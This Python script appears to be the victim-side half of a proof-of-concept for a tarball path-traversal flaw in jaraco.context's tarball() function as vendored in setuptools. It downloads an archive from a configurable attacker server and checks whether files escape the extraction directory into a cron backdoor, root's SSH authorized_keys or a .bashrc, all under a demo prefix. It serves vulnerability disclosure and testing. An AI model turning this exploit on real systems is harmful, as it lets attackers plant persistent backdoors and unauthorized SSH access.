#!/usr/bin/env python3
"""
Victim client that demonstrates the tarball path traversal.

Uses jaraco.context.tarball() to fetch from a malicious server,
triggering the strip_first_component vulnerability.
"""

import os
import sys
import shutil

# Ensure we use setuptools' vendored jaraco
SETUPTOOLS_VENDOR = os.environ.get('SETUPTOOLS_VENDOR', '/usr/local/lib/python3.12/site-packages/setuptools/_vendor')
if os.path.exists(SETUPTOOLS_VENDOR):
    sys.path.insert(0, SETUPTOOLS_VENDOR)

SERVER_HOST = os.environ.get('SERVER_HOST', 'server')
SERVER_PORT = os.environ.get('SERVER_PORT', '8080')
DEMO_PREFIX = os.environ.get('DEMO_PREFIX', '/tmp/demo')


def run_attack(scenario='cron'):
    """Execute the tarball path traversal attack."""
    from jaraco.context import tarball

    # Target paths based on scenario
    targets = {
        'cron': f'{DEMO_PREFIX}/etc/cron.d/backdoor',
        'ssh': f'{DEMO_PREFIX}/root/.ssh/authorized_keys',
        'bashrc': f'{DEMO_PREFIX}/home/victim/.bashrc',
    }

    target = targets.get(scenario, targets['cron'])

    # Ensure parent directories exist for the demo
    os.makedirs(os.path.dirname(target), exist_ok=True)

    # Clean up previous runs
    if os.path.exists(target):
        os.remove(target)

    print("=" * 60)
    print(f"EXECUTING ATTACK: {scenario.upper()}")
    print("=" * 60)
    print()

    url = f"http://{SERVER_HOST}:{SERVER_PORT}/package.tar.gz"
    print(f"[VICTIM] Fetching tarball from: {url}")
    print(f"[VICTIM] Expected extraction to: /tmp/safe_directory/")
    print()

    try:
        # This is what a legitimate user might do
        with tarball(url, target_dir="/tmp/safe_directory") as extracted:
            print(f"[VICTIM] Extraction returned: {extracted}")
            print(f"[VICTIM] Contents of {extracted}:")
            if os.path.exists(extracted):
                for item in os.listdir(extracted):
                    print(f"         - {item}")
            else:
                print("         (directory was cleaned up)")
    except Exception as e:
        print(f"[VICTIM] Exception: {e}")
        # Vulnerability might have triggered anyway

    print()

    # Check if the exploit worked
    if os.path.exists(target):
        print(f"[EXPLOITED] File written to: {target}")
        print()
        print("[FILE CONTENTS]")
        print("-" * 40)
        with open(target, 'r') as f:
            print(f.read())
        print("-" * 40)
        return True
    else:
        print(f"[FAILED] Target not created: {target}")
        return False


def main():
    print()
    print("=" * 60)
    print("TARBALL PATH TRAVERSAL VICTIM")
    print("jaraco/context.py strip_first_component bypass")
    print("=" * 60)
    print()
    print(f"Server: {SERVER_HOST}:{SERVER_PORT}")
    print(f"Demo prefix: {DEMO_PREFIX}")
    print()

    # Create demo directories
    os.makedirs(f"{DEMO_PREFIX}/etc/cron.d", exist_ok=True)
    os.makedirs(f"{DEMO_PREFIX}/root/.ssh", exist_ok=True)
    os.makedirs(f"{DEMO_PREFIX}/home/victim", exist_ok=True)

    results = {}

    # Switch to cron scenario and run
    import urllib.request
    for scenario in ['cron', 'ssh', 'bashrc']:
        try:
            urllib.request.urlopen(f"http://{SERVER_HOST}:{SERVER_PORT}/scenario/{scenario}")
        except:
            pass

        print()
        results[scenario] = run_attack(scenario)
        print()

    # Summary
    print()
    print("=" * 60)
    print("ATTACK SUMMARY")
    print("=" * 60)
    for scenario, success in results.items():
        status = "[EXPLOITED]" if success else "[FAILED]"
        print(f"  {status} {scenario}")

    return 0 if any(results.values()) else 1


if __name__ == "__main__":
    sys.exit(main())
